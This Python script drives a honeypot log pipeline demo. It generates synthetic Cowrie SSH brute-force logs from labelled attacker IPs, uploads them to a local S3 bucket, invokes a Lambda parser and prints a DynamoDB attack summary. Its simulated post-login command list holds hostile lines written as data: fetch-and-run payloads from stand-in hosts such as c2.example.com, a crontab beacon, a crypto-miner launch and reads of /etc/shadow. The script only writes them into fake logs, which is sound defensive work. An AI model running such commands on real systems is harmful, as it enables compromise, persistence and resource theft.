import boto3
import json
import time
import random
import string
from collections import defaultdict
from datetime import datetime, timedelta

s3 = boto3.client('s3')
dynamodb = boto3.resource('dynamodb')
table = dynamodb.Table('CowrieLogs')
lam = boto3.client('lambda')

BUCKET = 'honeypot-logs-2025'

ATTACKERS = [
    ('185.220.101.47',  'Tor exit node — Austria'),
    ('45.142.212.100',  'VPS — Netherlands'),
    ('194.165.16.158',  'Botnet node — Russia'),
    ('92.255.85.172',   'Botnet node — Russia'),
    ('103.99.0.122',    'Scanner — Singapore'),
    ('80.66.88.204',    'Mass scanner — Germany'),
    ('193.32.162.91',   'Credential sprayer — Ukraine'),
    ('62.233.50.11',    'Botnet node — Poland'),
]

PASSWORDS = [
    '123456', 'password', 'admin', 'root', 'toor', 'qwerty',
    '12345678', 'letmein', 'monkey', 'dragon', '111111', 'master',
    'abc123', 'pass123', 'test', 'guest', 'P@ssw0rd', 'raspberry',
    'ubuntu', 'alpine', 'changeme', '1q2w3e4r', 'default',
]

POST_LOGIN_COMMANDS = [
    [
        'uname -a',
        'cat /etc/passwd',
        'wget http://malware.example.com/bot.sh -O /tmp/bot.sh',
        'chmod +x /tmp/bot.sh && /tmp/bot.sh',
    ],
    [
        'ls /var/www',
        'cat /etc/shadow',
        'curl -s http://c2.example.com/payload | bash',
    ],
    [
        'ps aux',
        'netstat -tlnp',
        'crontab -l',
        'echo "*/5 * * * * curl http://c2.example.com/ping" | crontab -',
    ],
    [
        'cat /proc/cpuinfo',
        'free -m',
        'cd /tmp && wget http://pool.example.com/xmrig',
        './xmrig --donate-level 0 -o pool.example.com:3333 -u wallet123',
    ],
    [
        'id',
        'whoami',
        'ls -la /',
        'find / -perm -4000 2>/dev/null',
    ],
]


def rand_session():
    return ''.join(random.choices('0123456789abcdef', k=12))


def rand_port():
    return random.randint(30000, 65000)


def generate_cowrie_log():
    lines = []
    base = datetime.utcnow() - timedelta(hours=2)

    for ip, _ in ATTACKERS:
        t = base + timedelta(seconds=random.randint(0, 5400))
        attempts = random.sample(PASSWORDS, random.randint(4, 9))

        for i, pwd in enumerate(attempts):
            session = rand_session()
            offset = i * random.uniform(0.8, 2.5)
            ts  = (t + timedelta(seconds=offset)).strftime('%Y-%m-%dT%H:%M:%S.%f') + 'Z'
            ts2 = (t + timedelta(seconds=offset + 0.4)).strftime('%Y-%m-%dT%H:%M:%S.%f') + 'Z'

            lines.append(
                f"{ts} [HoneyPotSSHTransport,{i},{ip}] "
                f"New connection: {ip}:{rand_port()} (10.0.0.1:22) [session: {session}]"
            )
            lines.append(
                f"{ts2} [SSHService ssh-userauth on HoneyPotSSHTransport,{i},{ip}] "
                f"[{session}] login attempt [b'root'/b'{pwd}'] failed"
            )

        # ~40% chance an attacker gets a shell
        if random.random() < 0.4:
            session = rand_session()
            lucky_pwd = random.choice(['root', 'toor', 'admin123'])
            base_offset = len(attempts) * 2.5
            ts = (t + timedelta(seconds=base_offset)).strftime('%Y-%m-%dT%H:%M:%S.%f') + 'Z'

            lines.append(
                f"{ts} [HoneyPotSSHTransport,99,{ip}] "
                f"New connection: {ip}:{rand_port()} (10.0.0.1:22) [session: {session}]"
            )
            lines.append(
                f"{(t + timedelta(seconds=base_offset + 0.3)).strftime('%Y-%m-%dT%H:%M:%S.%f')}Z "
                f"[SSHService ssh-userauth on HoneyPotSSHTransport,99,{ip}] "
                f"[{session}] login attempt [b'root'/b'{lucky_pwd}'] "
            )
            for j, cmd in enumerate(random.choice(POST_LOGIN_COMMANDS)):
                cmd_ts = (t + timedelta(seconds=base_offset + 1 + j * 2)).strftime('%Y-%m-%dT%H:%M:%S.%f') + 'Z'
                lines.append(
                    f"{cmd_ts} [SSHChannel session (0) on SSHService on HoneyPotSSHTransport,99,{ip}] "
                    f"[{session}] CMD: {cmd}"
                )

    return '\n'.join(lines)


def wait_for_lambda_active(name, timeout=300):
    """Wait until Lambda state transitions from Pending to Active."""
    deadline = time.time() + timeout
    dots = 0
    while time.time() < deadline:
        try:
            resp = lam.get_function_configuration(FunctionName=name)
            state = resp.get('State', 'unknown')
            if state == 'Active':
                return True
            dots += 1
            if dots % 4 == 0:
                elapsed = int(time.time() - (deadline - timeout))
                print(f"      Lambda state: {state} ({elapsed}s — pulling runtime image...)")
        except lam.exceptions.ResourceNotFoundException:
            pass
        time.sleep(5)
    return False


def invoke_lambda_with_s3_event(key):
    """Invoke CowrieLogParser directly with an S3-format event."""
    s3_event = {
        "Records": [{
            "s3": {
                "bucket": {"name": BUCKET},
                "object": {"key": key}
            }
        }]
    }
    resp = lam.invoke(
        FunctionName='CowrieLogParser',
        InvocationType='RequestResponse',
        Payload=json.dumps(s3_event),
    )
    payload = json.loads(resp['Payload'].read())
    return payload.get('statusCode') == 200


def main():
    print("\n╔══════════════════════════════════════════════════╗")
    print("║   Honeypot-as-a-Service — Pipeline Demo           ║")
    print("╚══════════════════════════════════════════════════╝\n")

    # Wait for Lambda to be fully Active (Docker pulls runtime image on first run)
    print("[0/4] Waiting for CowrieLogParser to be Active...")
    print("      (First run pulls the Lambda runtime image — may take 2-3 min)")
    if not wait_for_lambda_active('CowrieLogParser'):
        print("      ERROR: Lambda not Active after 5 min. Check: docker compose logs localstack")
        return
    print("      Lambda Active\n")

    # Generate log
    print("[1/4] Generating Cowrie attack log...")
    log_content = generate_cowrie_log()
    line_count = len([l for l in log_content.split('\n') if l.strip()])
    print(f"      {line_count} log lines from {len(ATTACKERS)} attacker IPs\n")

    # Upload to S3
    timestamp = datetime.utcnow().strftime('%Y-%m-%d_%H-%M-%S')
    key = f"cowrie/logs/{timestamp}/cowrie.log"
    print(f"[2/4] Uploading to s3://honeypot-logs-2025/{key}")
    s3.put_object(Bucket=BUCKET, Key=key, Body=log_content.encode('utf-8'))
    print("      Uploaded — invoking CowrieLogParser Lambda\n")

    # Invoke Lambda directly with the S3 event (same payload the S3 trigger sends)
    print("[3/4] Invoking Lambda → DynamoDB...")
    ok = invoke_lambda_with_s3_event(key)
    if not ok:
        print("      Lambda returned an error. Check: docker compose logs localstack\n")
        return
    print("      Lambda executed successfully\n")

    # Query and summarise
    print("[4/4] Attack summary from DynamoDB:\n")
    items = table.scan().get('Items', [])

    if not items:
        print("      No items found in DynamoDB.")
        return

    by_ip = defaultdict(lambda: {'sessions': set(), 'logins': [], 'commands': []})
    for item in items:
        ip = item.get('src_ip', 'unknown')
        by_ip[ip]['sessions'].add(item.get('session'))
        inp = item.get('input', 'none')
        cmd = item.get('command', 'none')
        if inp and inp != 'none':
            by_ip[ip]['logins'].append(inp)
        if cmd and cmd != 'none':
            by_ip[ip]['commands'].append(cmd)

    attacker_labels = dict(ATTACKERS)
    print(f"  {'IP Address':<22} {'Label':<32} {'Sessions':>8} {'Attempts':>9} {'Commands':>9}")
    print("  " + "─" * 85)
    for ip, data in sorted(by_ip.items()):
        label = attacker_labels.get(ip, '')
        print(
            f"  {ip:<22} {label:<32} {len(data['sessions']):>8} "
            f"{len(data['logins']):>9} {len(data['commands']):>9}"
        )
        for cmd in data['commands'][:2]:
            print(f"  {'':22}   └─ {cmd[:60]}")

    print(f"\n  Total: {len(items)} log entries · {len(by_ip)} unique attacker IPs")
    print("\n╔══════════════════════════════════════════════════╗")
    print("║   Pipeline complete: S3 → Lambda → DynamoDB      ║")
    print("╠══════════════════════════════════════════════════╣")
    print("║  Inspect raw data:                                ║")
    print("║  docker compose exec localstack \\                ║")
    print("║    awslocal dynamodb scan --table-name CowrieLogs ║")
    print("╚══════════════════════════════════════════════════╝\n")


if __name__ == '__main__':
    main()
